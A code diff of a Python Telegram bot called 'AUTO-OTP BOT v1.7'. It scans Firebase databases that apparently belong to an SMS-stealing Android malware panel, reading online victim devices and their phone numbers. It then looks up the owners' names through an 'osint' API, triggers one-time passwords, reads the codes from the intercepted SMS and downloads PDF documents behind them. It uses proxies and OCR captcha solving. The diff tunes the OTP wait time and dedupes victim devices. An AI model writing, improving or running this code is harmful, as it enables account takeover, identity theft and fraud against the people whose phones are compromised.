@@ -1,6 +1,6 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.6                       ║
+║          AUTO-OTP BOT v1.7                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ╚══════════════════════════════════════════════════╝
 
@@ -49,6 +49,9 @@ DIVIDER = "━━━━━━━━━━━━━━━"
 NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="
 PROXY_FILE = "proxies.txt"
 PROXY_POOL = []
+
+# OTP wait time (seconds) — reduced from 120 to 60
+OTP_WAIT_SECONDS = 60
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("AutoOTP")
@@ -310,7 +313,7 @@ def _looks_like_phone(s):
 def _phone_from_any(obj, depth=0):
     """Recursively look for a phone-looking value under known keys."""
     if depth > 3 or not isinstance(obj, dict): return None
-    # Direct keys first (order matters — `to` first because that's what your DB uses)
+    # `to` first — that's what your DB uses
     for k in ("to","number","phone","phoneNumber","mobNo","mobile","num",
               "msisdn","contact","user","recipient","target","destination"):
         if k in obj:
@@ -334,65 +337,88 @@ def _is_online(dd):
 
 
 def fb_scan():
-    devs = []
+    """Scan all DBs. Dedupe by phone — keep the freshest online device per phone."""
+    by_phone = {}  # phone -> best candidate
+
     with firebase_lock: dbs = list(firebase_dbs)
 
     for db in dbs:
         url = db['url'].rstrip('/'); auth = db['auth']
 
-        # 1) Load /clients (online status)
+        # 1) /clients
         try:
             r = requests.get(f"{url}/clients.json?auth={auth}", timeout=12)
             clients = r.json() if r.status_code == 200 else None
         except: clients = None
         if not isinstance(clients, dict) or not clients: continue
 
-        # 2) Load /commands (device_id -> phone via .commands.to)
+        # 2) /commands
         try:
             r = requests.get(f"{url}/commands.json?auth={auth}", timeout=12)
             commands = r.json() if r.status_code == 200 else {}
         except: commands = {}
         if not isinstance(commands, dict): commands = {}
 
-        # 3) Load /sendSms as fallback
+        # 3) /sendSms (fallback)
         try:
             r = requests.get(f"{url}/sendSms.json?auth={auth}", timeout=12)
             sendsms = r.json() if r.status_code == 200 else {}
         except: sendsms = {}
         if not isinstance(sendsms, dict): sendsms = {}
 
-        logger.info(f"[SCAN] {url.split('//')[-1][:40]} clients={len(clients)} commands={len(commands)} sendSms={len(sendsms)}")
+        logger.info(f"[SCAN] {url.split('//')[-1][:40]} clients={len(clients)} "
+                    f"commands={len(commands)} sendSms={len(sendsms)}")
 
         for did, dd in clients.items():
             if not isinstance(dd, dict): continue
             if not _is_online(dd): continue
 
-            # -------- phone lookup chain --------
-            ph = None
-
-            # (a) directly in the client record
+            # Phone lookup chain
             ph = _phone_from_any(dd)
-
-            # (b) in /commands[did]
             if not ph and did in commands:
                 ph = _phone_from_any(commands[did])
-
-            # (c) in /sendSms[did]
             if not ph and did in sendsms:
                 ph = _phone_from_any(sendsms[did])
-
             if not ph:
                 logger.info(f"[SCAN] no phone for {did}")
                 continue
 
-            with used_lock:
-                if ph not in used_numbers:
-                    devs.append({
-                        "db_url": url, "db_auth": auth,
-                        "dev_id": did, "phone": ph, "phone_display": ph,
-                        "battery": str(dd.get("battery","?"))[:6]
-                    })
+            # Score for dedupe
+            last_ts = 0
+            for k in ("lastMessageTime","last_message_time","lastSeen","timestamp"):
+                v = dd.get(k)
+                if isinstance(v, (int, float)) and v > last_ts:
+                    last_ts = int(v)
 
+            batt_raw = str(dd.get("battery","")).replace("%","").strip()
+            try: batt = int(batt_raw) if batt_raw else 0
+            except: batt = 0
+
+            candidate = {
+                "db_url": url, "db_auth": auth,
+                "dev_id": did, "phone": ph, "phone_display": ph,
+                "battery": str(dd.get("battery","?"))[:6],
+                "last_ts": last_ts, "batt_int": batt,
+            }
+
+            prev = by_phone.get(ph)
+            if prev is None or (candidate["last_ts"], candidate["batt_int"]) > \
+                               (prev["last_ts"], prev["batt_int"]):
+                by_phone[ph] = candidate
+
+    # Filter out already-used numbers and return list
+    devs = []
+    with used_lock:
+        for ph, cand in by_phone.items():
+            if ph in used_numbers: continue
+            devs.append({
+                "db_url": cand["db_url"], "db_auth": cand["db_auth"],
+                "dev_id": cand["dev_id"], "phone": cand["phone"],
+                "phone_display": cand["phone_display"],
+                "battery": cand["battery"],
+            })
+
+    logger.info(f"[SCAN] unique online phones: {len(devs)}")
     return devs
 
 
@@ -404,7 +430,7 @@ def fb_msgids(url,auth,did):
     return set()
 
 
-def fb_otp(url,auth,did,existing,timeout=120):
+def fb_otp(url,auth,did,existing,timeout=OTP_WAIT_SECONDS):
     t0=time.time()
     while time.time()-t0<timeout:
         try:
@@ -482,8 +508,9 @@ def auto_worker(cid, count):
             if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ OTP failed: {lerr}")
             continue
 
-        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n✓ OTP sent!\n<i>◌ Waiting SMS (2min)...</i>")
-        otp=fb_otp(dev["db_url"],dev["db_auth"],dev["dev_id"],eids,120)
+        wait_min = OTP_WAIT_SECONDS // 60
+        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n✓ OTP sent!\n<i>◌ Waiting SMS ({wait_min}min)...</i>")
+        otp=fb_otp(dev["db_url"],dev["db_auth"],dev["dev_id"],eids,OTP_WAIT_SECONDS)
         if not otp:
             if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ No OTP received")
             continue
@@ -513,8 +540,8 @@ def auto_worker(cid, count):
             if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob} | EID:{eid}\n✗ PDF OTP failed")
             continue
 
-        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn} | EID:{eid}\n<i>◌ Waiting PDF OTP...</i>")
-        potp=fb_otp(dev["db_url"],dev["db_auth"],dev["dev_id"],eids2,120)
+        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn} | EID:{eid}\n<i>◌ Waiting PDF OTP ({wait_min}min)...</i>")
+        potp=fb_otp(dev["db_url"],dev["db_auth"],dev["dev_id"],eids2,OTP_WAIT_SECONDS)
         if not potp:
             if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ PDF OTP timeout")
             continue
@@ -655,7 +682,7 @@ def handle(cid, text):
         if not devs:
             send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n\n<i>Run /debugscan and /debugusers.</i>")
             return
-        ls=[f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices</b>\n"]
+        ls=[f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices (unique)</b>\n"]
         for i,d in enumerate(devs[:50],1):
             dn=d["db_url"].split("//")[1].split("-default")[0]
             ls.append(f"{i}. <code>{d['phone']}</code> | 🔋{d['battery']} | {dn}")
@@ -761,7 +788,6 @@ def handle(cid, text):
                             if isinstance(v, dict):
                                 flds = list(v.keys())[:12]
                                 report.append(f"     fields: {', '.join(flds)}")
-                                # Look inside nested commands/sendSms for phone
                                 for sub in flds:
                                     if isinstance(v.get(sub), dict):
                                         for sk, sv in list(v[sub].items())[:5]:
@@ -843,7 +869,7 @@ def handle(cid, text):
         with firebase_lock: dc=len(firebase_dbs)
         with used_lock: uc=len(used_numbers)
         ar=sum(1 for e in auto_running.values() if not e.is_set())
-        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>Status</b>\n\n◈ Firebase · {dc}\n◈ Used · {uc}\n◈ Running · {ar}\n◈ Proxies · {len(PROXY_POOL)}\n◈ OCR · {'✓' if ocr_solver else '✗'}")
+        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>Status</b>\n\n◈ Firebase · {dc}\n◈ Used · {uc}\n◈ Running · {ar}\n◈ Proxies · {len(PROXY_POOL)}\n◈ OTP Wait · {OTP_WAIT_SECONDS}s\n◈ OCR · {'✓' if ocr_solver else '✗'}")
 
 # ============== MAIN ==============
 def main():
